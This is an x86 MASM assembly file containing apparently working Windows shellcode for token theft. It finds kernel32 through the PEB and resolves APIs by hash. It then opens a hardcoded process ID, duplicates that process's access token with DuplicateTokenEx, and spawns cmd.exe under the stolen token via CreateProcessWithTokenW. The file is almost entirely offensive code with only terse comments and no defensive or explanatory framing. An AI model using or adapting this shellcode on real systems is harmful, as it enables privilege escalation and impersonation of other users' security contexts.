.586

.MODEL FLAT, STDCALL

OPTION casemap:none

.DATA

.CODE
    start:
        mov ebp, esp                    ;
        add esp, 0fffff9f0H             ;
    find_kernel32:
        xor ecx,ecx                     ;
        ASSUME FS:NOTHING               ;
        mov esi,fs:[ecx+30h]            ;
        mov esi,[esi+0Ch]               ;
        mov esi,[esi+1Ch]               ;
    next_module:
        mov ebx, [esi+8h]               ;
        mov edi, [esi+20h]              ;
        mov esi, [esi]                  ;
        cmp [edi+12*2], cx              ;
        jne next_module                 ;
    find_function_shorten:
        jmp find_function_shorten_bnc   ;
    find_function_ret:
        pop esi                         ;
        mov [ebp+4H], esi             ;
        jmp resolve_symbols_kernel32    ;
    find_function_shorten_bnc:
        call find_function_ret          ;
    find_function:
        pushad                          ;
        mov eax, [ebx+3ch]             ;
        mov edi, [ebx+eax+78h]         ;
        add edi, ebx                    ;
        mov ecx, [edi+18h]             ;
        mov eax, [edi+20h]             ;
        add eax, ebx                    ;
        mov [ebp-4], eax                ;
    find_function_loop:
        jecxz find_function_finished    ;
        dec ecx                         ;
        mov eax, [ebp-4]                ;
        mov esi, [eax+ecx*4]            ;
        add esi, ebx                    ;
    compute_hash:
        xor eax, eax                    ;
        cdq                             ;
        cld                             ;
    compute_hash_again:
        lodsb                           ;
        test al, al                     ;
        jz compute_hash_finished        ;
        ror edx, 0dH                   ;
        add edx, eax                    ;
        jmp compute_hash_again          ;
    compute_hash_finished:
    find_function_compare:
        cmp edx, [esp+24H]             ;
        jnz find_function_loop          ;
        mov edx, [edi+24H]             ;
        add edx, ebx                    ;
        mov cx, [edx+2*ecx]             ;
        mov edx, [edi+1cH]             ;
        add edx, ebx                    ;
        mov eax, [edx+4*ecx]            ;
        add eax, ebx                   ;
        mov [esp+1cH], eax             ;
    find_function_finished:
        popad                          ;
        ret                            ;

    resolve_symbols_kernel32:
        push 78b5b983h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+10h], eax             ;Save TerminateProcess address for later

        push 0ec0e4e8eh;
        call dword ptr [ebp+4h]        ;
        mov [ebp+14h], eax             ;Save LoadLibraryA address for later

        push 0EFE297C0h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+18h], eax             ;Save OpenProcess address for later

    load_Advapi32:
        push 0h
        push 6c6c642eh;
        push 32336970h;
        push 61766441h;
        push esp;
        call dword ptr [ebp+14h];
        mov ebx, eax                   ;Move the base address of Advapi32.dll to EBX

        push 591EA70Fh;
        call dword ptr [ebp+4h]        ;
        mov [ebp+1ch], eax             ;Save OpenProcessToken address for later

        push 3A55BBB2h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+20h], eax             ;Save DuplicateTokenEx address for later

        push 0E40B58F7h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+24h], eax             ;Save CreateProcessWithTokenW address for later

    OpenProcess:
        push 4892                      ; PID
        push 1h                        ;
        push 400h                      ; PROCESS_QUERY_INFORMATION == 400h  PROCESS_ALL_ACCESS == 1f07ffh
        call dword ptr [ebp+18h]       ; call OpenProcess func

    Open_process_token:
        lea ebx, [ebp+30h]             ; accessToken
        push ebx                       ;
        push 0bh                       ; TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY 
        push eax                       ;
        call dword ptr [ebp+1ch]       ; call OpenProcessToken func

    SECURITY_ATTRIBUTES:
        xor eax, eax                   ;
        push eax                       ;
        push eax                       ;
        push 0ch                       ; nsize == 12
        mov esi, esp                   ;
    
    DuplicateTokenEx:
        lea ebx, [ebp+34h];
        push ebx;  phNewToken
        push 2h;   TokenType
        push 2h;   ImpersonationLevel
        push esi;  lpTokenAttributes
        push 0f01ffh                   ; TOKEN_ALL_ACCESS 
        mov ebx, [ebp+30h];
        push ebx;  accessToken
        call dword ptr [ebp+20h];

    initialize_structs:
        xor ecx, ecx                    ; #Zero ECX
        mov cl, 54h                     ; #Set the lower order bytes of ECX to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
        sub esp, ecx                    ; #Allocate stack space for the two structures
        mov edi, esp                    ; #set edi to point to the STARTUPINFO structure
        push edi                        ; #Preserve EDI on the stack as it will be modified by the following instructions

	zero_structs:
        xor eax, eax                    ; #Zero EAX
        rep stosb                       ; #Repeat storing zero at the buffer starting at edi until ecx is zero
        pop edi                         ; #restore EDI to its original value
        mov byte ptr [edi], 44h         ; #cb = 0x44 (size of the structure)

    CreateProcessWithTokenW:
        push 00000065h;
        push 00780065h;
        push 002e0064h;
        push 006d0063h; utf-8
        push esp;
        pop ebx;
        xor eax, eax                    ; #Zero EAX
        lea esi, [edi+44h]              ; #Load the effective address of the PROCESS_INFORMATION structure into ESI
        push esi                        ; #Push the pointer to the lpProcessInformation structure
        push edi                        ; #Push the pointer to the lpStartupInfo structure
        push eax;
        push eax;
        push eax;
        push eax;
        push ebx;
        push eax;
        mov eax, [ebp+34h];
        push eax                        ;  #phNewToken
        call dword ptr [ebp+24h];



       










end start
